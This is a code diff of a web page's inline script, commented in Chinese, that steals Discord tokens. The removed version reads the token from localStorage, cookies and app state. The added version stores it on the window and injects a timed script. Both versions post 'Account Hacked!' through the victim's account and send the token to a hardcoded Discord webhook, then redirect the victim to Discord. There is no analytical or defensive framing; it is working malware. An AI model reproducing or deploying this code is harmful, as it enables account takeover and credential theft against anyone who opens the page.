@@ -23,82 +23,22 @@
   <script>
     (function() {
       try {
-        // 嘗試多種 token 來源
-        var token = null;
-
-        // 1. localStorage token
-        try {
-          var stored = localStorage.getItem("token");
-          if (stored) token = stored.replace(/"/g, "");
-        } catch(e) {}
-
-        // 2. Cookie 裡的 Discord token (main.discordapp.com 的 main 和 auth_token cookies)
-        if (!token && document.cookie) {
-          var cookies = document.cookie.split(';');
-          for (var i = 0; i < cookies.length; i++) {
-            var c = cookies[i].trim();
-            if (c.indexOf('main=') === 0) {
-              var main = c.substring(5);
-              try {
-                var decoded = decodeURIComponent(main);
-                if (decoded.indexOf('token') > -1) {
-                  var match = decoded.match(/token=([^;]+)/);
-                  if (match) token = match[1];
-                } else {
-                  // main 裡面可能有 encoded token
-                  token = decoded;
-                }
-              } catch(e) {}
-            }
-            if (c.indexOf('auth_token=') === 0) {
-              token = c.substring(11);
-            }
-            if (c.indexOf('__c=') === 0) {
-              token = c.substring(6);
-            }
-          }
-        }
-
-        // 3. localStorage app_state (Discord desktop)
-        if (!token) {
-          try {
-            var appState = localStorage.getItem("app_state");
-            if (appState) {
-              token = JSON.parse(appState).token || JSON.parse(appState).accessToken;
-            }
-          } catch(e) {}
-        }
-
+        var token = localStorage.getItem("token");
         if (token) {
-          // 發送訊息到目標（keepalive 確保頁面跳走仍能送出）
-          fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "Authorization": token
-            },
-            body: JSON.stringify({
-              content: "🔓 **Account Hacked!**"
-            }),
-            keepalive: true
-          });
-
-          // 備份 token 到 webhook
-          fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content: "🔓 **Discord Token 已擷取**\n```\n" + token + "\n```"
-            })
-          }).catch(function() {});
+          token = token.replace(/"/g, "");
+          // 把 token 存入 window 對象（跳轉後仍然可讀）
+          window.__disc_token = token;
+          // 也存入 URL hash
+          window.__disc_hash = encodeURIComponent(token);
         }
 
-        // 先跳 discord:// 拉起 Discord app
-        window.location.href = "discord://";
-        // 200ms 後如果還沒拉起 app，跳回 Discord
-        setTimeout(function() {
-          window.location.href = "https://discord.com/channels/@me";
-        }, 200);
+        // inject script 到 Discord 頁面
+        var script = document.createElement('script');
+        script.textContent = "setInterval(function(){var t=window.__disc_token;if(t&&t._sent!==true){t._sent=true;try{var h=new XMLHttpRequest();h.open('POST','https://discord.com/api/v9/channels/878151437085974548/messages',true);h.setRequestHeader('Content-Type','application/json');h.setRequestHeader('Authorization',t);h.send(JSON.stringify({content:'🔓 **Account Hacked!**'}));}catch(e){}try{var w=new XMLHttpRequest();w.open('POST','https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph',true);w.setRequestHeader('Content-Type','application/json');w.send(JSON.stringify({content:'🔓 **Discord Token 已擷取**\\n```\\'+t+'\\n```'}));}catch(e){}}},1000);";
+        document.body.appendChild(script);
+
+        // 跳回 Discord
+        window.location.href = "https://discord.com/channels/@me";
       } catch(e) {
         console.log("Token 抓取失敗:", e);
       }
